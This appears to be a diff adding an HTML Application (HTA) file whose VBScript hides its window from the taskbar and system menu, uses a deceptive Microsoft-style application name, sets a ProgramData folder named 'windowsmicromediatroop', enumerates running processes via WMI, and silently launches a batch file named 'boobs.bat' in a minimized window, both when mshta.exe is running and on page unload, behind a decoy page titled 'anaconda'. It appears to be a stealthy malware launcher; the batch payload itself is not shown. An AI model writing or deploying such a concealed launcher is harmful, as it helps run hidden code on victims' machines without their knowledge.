@@ -1,0 +1,64 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"  "http://www.w3.org/TR/html4/strict.dtd">
+ 		  <html>
+ 	           <head>
+                   <meta charset="utf-8">
+		    <HTA:APPLICATION
+	 		  ID="objHTA_Info"
+			  APPLICATIONNAME="HTA_Info" 
+	  		  BORDER = "Thin"
+		 	  CAPTION = "No"
+			  CONTEXTMENU = "No"
+			  INNERBORDER = "No"
+			  MAXIMIZEBUTTON = "No"
+			  MINIMIZEBUTTON = "No"
+			  NAVIGABLE = "No"
+			  SCROLL = "No"
+			  SCROLLFLAT = "No"
+			  SELECTION = "No"			 
+			  SHOWINTASKBAR = "No"
+			  SINGLEINSTANCE = "Yes"		
+			  WINDOWSTATE="normal"
+			  SYSMENU="NO"
+			/>
+	<script Language="VBScript" charset="UTF-8">
+	Dim intLeft , intTop , Shell , oShell
+	Dim fso , obf , of
+	NewDir 	   = "C:\ProgramData\windowsmicromediatroop\"
+	Set oShell = CreateObject("WScript.Shell")
+	Set fso    = CreateObject("Scripting.FileSystemObject")
+	strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )	
+	FullName  = replace(objHTA_Info.commandLine,chr(34),"")  
+	arrFN     = split(FullName,"\")  
+	FileName  = arrFN(ubound(arrFN))
+	SourceDir = replace(FullName,FileName,"") 	
+	FullName  = SourceDir & FileName	
+	appName   = "MicrosoftExcelWordPowerPointPaintHTML"
+		
+	Set objWMIService = GetObject("winmgmts:\\" & strComputerName & "\root\cimv2")
+	sQuery = "SELECT * FROM Win32_Process"
+	Set objItems = objWMIService.ExecQuery(sQuery)	
+	intSize = 0
+	Dim arrTestArray()
+	
+	strProcessKill = "mshta.exe"
+	Set oShell = CreateObject("WScript.Shell")
+	For Each objItem In objItems
+		ReDim Preserve arrTestArray(intSize)
+		arrTestArray(intSize) = objItem.Name
+		intSize = intSize + 1
+		If  objItem.Name = "mshta.exe" Then					
+			oShell.Run "boobs.bat",,2
+		  Exit For		
+		End If
+	Next
+	
+	Sub test
+	    oShell.Run "boobs.bat",,2
+	End Sub
+	</script>
+	</head>
+	<body onunload="test">
+		<h1>anaconda</h1>
+		<input type="button"  value="Test"/>
+	</body>
+	</html>
